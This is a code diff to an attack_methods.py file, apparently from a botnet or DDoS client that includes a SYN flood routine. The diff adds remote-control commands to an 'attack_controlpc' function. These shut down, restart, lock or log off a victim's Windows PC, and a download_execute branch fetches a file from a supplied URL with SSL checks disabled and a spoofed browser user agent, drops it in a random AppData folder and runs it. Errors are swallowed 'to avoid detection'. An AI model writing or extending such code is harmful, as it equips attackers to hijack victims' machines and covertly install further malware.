@@ -221,40 +221,49 @@ def generate_syn_packet(src_ip, dst_ip, src_port, dst_port):
 # Add this function to the attack_methods.py file
 def attack_controlpc(target, duration=60):
     """Remote control PC functions - Admin only"""
-    # This method is for admin control only and won't be used in normal attacks
-    # The target parameter will contain the command and parameters
-    
     # Parse the target string to get command and parameters
-    # Format: command|param1|param2|...
     parts = target.split('|')
     command = parts[0]
     
-    if command == "shutdown":
-        # Shutdown the computer
-        try:
+    try:
+        if command == "shutdown":
+            # Shutdown the computer
             import os
             os.system("shutdown /s /t 1")
-        except:
-            pass
             
-    elif command == "popup":
-        # Display a popup message
-        if len(parts) > 1:
-            message = parts[1]
-            try:
+        elif command == "restart":
+            # Restart the computer
+            import os
+            os.system("shutdown /r /t 1")
+            
+        elif command == "lock":
+            # Lock the computer
+            import ctypes
+            ctypes.windll.user32.LockWorkStation()
+            
+        elif command == "logoff":
+            # Log off the current user
+            import os
+            os.system("shutdown /l /f")
+            
+        elif command == "popup":
+            # Display a popup message
+            if len(parts) > 1:
+                message = parts[1]
                 import ctypes
                 ctypes.windll.user32.MessageBoxW(0, message, "System Message", 0)
-            except:
-                pass
                 
-    elif command == "download_execute":
-        # Download and execute a file
-        if len(parts) > 1:
-            url = parts[1]
-            try:
+        elif command == "download_execute":
+            # Download and execute a file
+            if len(parts) > 1:
+                url = parts[1]
                 import os
                 import tempfile
                 import urllib.request
+                import ssl
+                
+                # Bypass SSL verification
+                ssl._create_default_https_context = ssl._create_unverified_context
                 
                 # Create a random folder in AppData/Local
                 appdata_path = os.environ['LOCALAPPDATA']
@@ -266,12 +275,20 @@ def attack_controlpc(target, duration=60):
                 file_name = url.split('/')[-1] or "file.exe"
                 file_path = os.path.join(target_dir, file_name)
                 
-                urllib.request.urlretrieve(url, file_path)
+                # Use urllib to download
+                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
+                req = urllib.request.Request(url, headers=headers)
+                
+                with urllib.request.urlopen(req) as response, open(file_path, 'wb') as out_file:
+                    data = response.read()
+                    out_file.write(data)
                 
                 # Execute the file
                 os.startfile(file_path)
-            except:
-                pass
+                
+    except Exception as e:
+        # Silently fail to avoid detection
+        pass
                 
 def attack_syn_flood(target, duration=60):
     """High-performance SYN flood using raw sockets"""
